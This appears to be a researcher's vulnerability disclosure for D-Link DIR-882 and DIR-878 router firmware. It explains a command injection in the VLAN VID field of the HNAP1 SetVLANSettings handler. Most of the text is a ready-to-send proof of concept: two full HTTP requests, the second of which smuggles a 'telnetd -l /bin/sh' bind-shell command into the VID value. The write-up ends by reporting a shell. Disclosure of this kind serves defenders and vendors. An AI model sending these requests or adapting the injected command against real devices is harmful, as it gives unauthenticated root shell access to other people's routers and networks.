D-link4/vuln_37/37.md

# D-Link Vulnerability

Vendor:D-Link

Product:DIR_882、DIR_878

Version:DIR_882_FW130B06、DIR_878_FW130B08

Type:Command Execution

Author:Jiaqian Peng

Institution:pengjiaqian@iie.ac.cn



## Vulnerability description

We found an Command Injection vulnerability  in D-Link Technology router with firmware which was released recently. A command Injection vulnerability allows attackers to execute arbitrary OS commands via a crafted /HNAP1 POST request.

**Remote Command Execution**

In `prog.cgi` binary:

In `SetVLANSettings` function,`VLANID:1/VID` is directly passed by the attacker. After that, call the function nvram_safe_set to store this input.

<div  align="center"><img src="./images/1.png" style="zoom:80%;" /></div>

In `rc` binary:

In `start_wan` function, the initial input will be extracted. Eventually, the initial input will cause command injection.

The necessary condition for successfully triggering the vulnerability is to enable the dhcp service, so we need to send two packets to complete the triggering of the vulnerability.

<div  align="center"><img src="./images/2.png" style="zoom:80%;" /></div>

<div  align="center"><img src="./images/3.png" style="zoom:70%;" /></div>

**Supplement**

The trigger point of this vulnerability is deep in the program path, so we recommend that the string content should be strictly checked when extracting user input.

Vulnerability trigger steps:

* Enable dhcp service, in (`SetWan2Settings`)
* set `VLANID:1/VID`=2 ;telnetd -l /bin/sh -p 1115 -b 0.0.0.0;, in (`SetVLANSettings`)



## PoC

Enable dhcp service, in (`SetWan2Settings`)

```http
POST /HNAP1/ HTTP/1.1
Host: 192.168.100.1
Content-Length: 808
SOAPAction: "http://purenetworks.com/HNAP1/SetWan2Settings"
X-Requested-With: XMLHttpRequest
HNAP_AUTH: 41FA364C25CF06B51AB7984DF062D686 1727318676320
Accept: */*
Content-Type: text/xml; charset=UTF-8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0
Origin: http://192.168.100.1
Referer: http://192.168.100.1/UsbSharing.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: uid=hzIarr26
Connection: close

<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
	<soap:Body>
		<SetWan2Settings xmlns="http://purenetworks.com/HNAP1/">
			<Type>DHCP</Type>
			<Username/>
			<Password/>
			<MaxIdleTime/>
			<HostName></HostName>
			<VPNIPAddress/>
			<VPNSubnetMask/>
			<VPNGateway/>
			<ServiceName/>
			<AutoReconnect/>
			<IPAddress/>
			<SubnetMask/>
			<Gateway/>
			<ConfigDNS>
				<Primary></Primary>
				<Secondary></Secondary>
			</ConfigDNS>
			<MacAddress></MacAddress>
			<MTU>1500</MTU>
			<DsLite_Configuration/>
			<DsLite_AFTR_IPv6Address/>
			<DsLite_B4IPv4Address/>
		</SetWan2Settings>
	</soap:Body>
</soap:Envelope>
```

<div  align="center"><img src="./images/4.png" style="zoom:80%;" /></div>

set `VLANID:1/VID`=2 ;telnetd -l /bin/sh -p 1115 -b 0.0.0.0;, in (`SetVLANSettings`)

```http
POST /HNAP1/ HTTP/1.1
Host: 192.168.100.1
Content-Length: 1438
SOAPAction: "http://purenetworks.com/HNAP1/SetVLANSettings"
X-Requested-With: XMLHttpRequest
HNAP_AUTH: 883001F3220BBCE441F4DAEB63634B6B 1727318724611
Accept: */*
Content-Type: text/xml; charset=UTF-8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0
Origin: http://192.168.100.1
Referer: http://192.168.100.1/Internet_VLAN.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: uid=hzIarr26
Connection: close

<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><SetVLANSettings xmlns="http://purenetworks.com/HNAP1/"><Enabled>true</Enabled><PriorityEnabled>false</PriorityEnabled><ISPName>Others</ISPName><VLANIDInfoLists><VLANID><Service>Internet</Service><Tagged>false</Tagged><VID>0</VID><Priority>0</Priority><VendorClass></VendorClass></VLANID><VLANID><Service>IPTV</Service><Tagged>false</Tagged><VID>2 ;telnetd -l /bin/sh -p 1115 -b 0.0.0.0;</VID><Priority>0</Priority><VendorClass></VendorClass></VLANID><VLANID><Service>VOIP</Service><Tagged>false</Tagged><VID>0</VID><Priority>0</Priority><VendorClass></VendorClass></VLANID></VLANIDInfoLists><VLANRuleInfoLists><VLANRule><Interface>LAN1</Interface><ServiceMapping>Internet</ServiceMapping></VLANRule><VLANRule><Interface>LAN2</Interface><ServiceMapping>Internet</ServiceMapping></VLANRule><VLANRule><Interface>LAN3</Interface><ServiceMapping>Internet</ServiceMapping></VLANRule><VLANRule><Interface>LAN4</Interface><ServiceMapping>Internet</ServiceMapping></VLANRule><VLANRule><Interface>WLAN</Interface><ServiceMapping>Internet</ServiceMapping></VLANRule><VLANRule><Interface>WLANGuestZone</Interface><ServiceMapping>Internet</ServiceMapping></VLANRule></VLANRuleInfoLists></SetVLANSettings></soap:Body></soap:Envelope>
```

<div  align="center"><img src="./images/5.png" style="zoom:80%;" /></div>



## Result

Get a shell!

<div  align="center"><img src="./images/6.png" style="zoom:100%;" /></div>
